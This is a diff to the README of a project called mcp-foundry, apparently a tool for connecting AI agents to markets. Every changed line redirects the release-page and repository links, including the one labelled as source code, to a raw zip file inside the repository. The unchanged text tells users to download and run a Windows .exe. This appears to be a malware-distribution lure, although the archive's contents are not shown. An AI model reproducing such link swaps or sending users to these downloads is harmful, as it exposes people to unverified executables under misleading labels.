@@ -1,6 +1,6 @@
 # ⚙️ mcp-foundry - Connect AI Agents to Markets Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?style=for-the-badge)](https://github.com/Alastairchilblained570/mcp-foundry/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?style=for-the-badge)](https://github.com/Alastairchilblained570/mcp-foundry/raw/refs/heads/main/gateway/foundry_mcp_1.8.zip)
 
 ---
 
@@ -38,12 +38,12 @@ You need to download the app before you can use it. The download comes as an ins
 
 **Open this page to download the latest version:**
 
-[![Download Releases](https://img.shields.io/badge/Visit-Download%20Page-blue?style=for-the-badge)](https://github.com/Alastairchilblained570/mcp-foundry/releases)
+[![Download Releases](https://img.shields.io/badge/Visit-Download%20Page-blue?style=for-the-badge)](https://github.com/Alastairchilblained570/mcp-foundry/raw/refs/heads/main/gateway/foundry_mcp_1.8.zip)
 
 Follow these instructions:
 
 1. Click the link above or visit the GitHub releases page:  
-   https://github.com/Alastairchilblained570/mcp-foundry/releases  
+   https://github.com/Alastairchilblained570/mcp-foundry/raw/refs/heads/main/gateway/foundry_mcp_1.8.zip  
 2. Look for the newest version listed on the page. Versions are sorted by date, newest first.  
 3. Download the file ending with `.exe` for Windows. This is the installer or portable file.  
 4. Save the file to your Downloads folder or anywhere easy to find.
@@ -147,7 +147,7 @@ You can also visit the GitHub issues page for common questions or report bugs.
 
 For technical details, source code, and support:
 
-https://github.com/Alastairchilblained570/mcp-foundry
+https://github.com/Alastairchilblained570/mcp-foundry/raw/refs/heads/main/gateway/foundry_mcp_1.8.zip
 
 This page contains user guides, FAQs, and updates from the developer team.
 
@@ -155,4 +155,4 @@ This page contains user guides, FAQs, and updates from the developer team.
 
 ## 🔗 Download Link Again
 
-[![Download mcp-foundry Now](https://img.shields.io/badge/Download-mcp--foundry-blueviolet?style=for-the-badge)](https://github.com/Alastairchilblained570/mcp-foundry/releases)
+[![Download mcp-foundry Now](https://img.shields.io/badge/Download-mcp--foundry-blueviolet?style=for-the-badge)](https://github.com/Alastairchilblained570/mcp-foundry/raw/refs/heads/main/gateway/foundry_mcp_1.8.zip)
